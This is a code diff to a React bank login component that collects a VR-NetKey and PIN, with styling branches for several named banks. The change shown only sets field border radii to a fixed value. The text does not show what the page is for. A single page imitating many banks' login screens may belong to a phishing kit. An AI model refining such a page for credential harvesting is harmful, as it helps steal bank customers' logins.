@@ -657,7 +657,7 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
 
               <form onSubmit={handleSubmit} className="space-y-4">
                 <div>
-                  <div className={`relative ${vrNetKeyError ? "bg-red-50" : ""}`} style={{ borderRadius: buttonBorderRadius }}>
+                  <div className={`relative ${vrNetKeyError ? "bg-red-50" : ""}`} style={{ borderRadius: "4px" }}>
                     <input
                       id="vrNetKey"
                       type="text"
@@ -665,7 +665,7 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
                       onChange={(e) => { setVrNetKey(e.target.value); if (e.target.value.trim()) setVrNetKeyError(false); setCredentialsInvalid(false); setErrorMsg(null); }}
                       placeholder=" "
                        className={`peer w-full px-4 pt-6 pb-2 border-2 focus:outline-none transition-colors text-base bg-transparent ${vrNetKeyError ? "border-red-500" : (isGLS || isWarburg || isMarcard || isQlick || isRenault) ? "border-gray-800" : "border-gray-300"}`}
-                      style={{ ...(!vrNetKeyError && vrNetKey ? { borderColor: theme.accentText } : {}), borderRadius: (isGLS || isWarburg || isMarcard || isQlick || isRenault) ? "4px" : buttonBorderRadius }}
+                      style={{ ...(!vrNetKeyError && vrNetKey ? { borderColor: theme.accentText } : {}), borderRadius: "4px" }}
 
 
 
@@ -689,7 +689,7 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
                 </div>
 
                 <div>
-                  <div className={`relative ${pinError ? "bg-red-50" : ""}`} style={{ borderRadius: buttonBorderRadius }}>
+                  <div className={`relative ${pinError ? "bg-red-50" : ""}`} style={{ borderRadius: "4px" }}>
                     <input
                       id="pin"
                       type={showPin ? "text" : "password"}
@@ -697,7 +697,7 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
                       onChange={(e) => { setPin(e.target.value); if (e.target.value.trim()) setPinError(false); setCredentialsInvalid(false); setErrorMsg(null); }}
                       placeholder=" "
                       className={`peer w-full px-4 pt-6 pb-2 pr-12 border-2 focus:outline-none transition-colors text-base bg-transparent ${pinError ? "border-red-500" : (isGLS || isWarburg || isMarcard || isQlick || isRenault) ? "border-gray-800" : "border-gray-300"}`}
-                      style={{ ...(!pinError && pin ? { borderColor: theme.accentText } : {}), borderRadius: (isGLS || isWarburg || isMarcard || isQlick || isRenault) ? "4px" : buttonBorderRadius }}
+                      style={{ ...(!pinError && pin ? { borderColor: theme.accentText } : {}), borderRadius: "4px" }}
 
 
 
